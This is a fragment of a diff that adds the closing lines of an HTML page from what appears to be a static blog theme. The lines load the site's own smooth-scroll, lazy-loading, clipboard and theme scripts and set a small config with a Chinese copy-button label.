+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
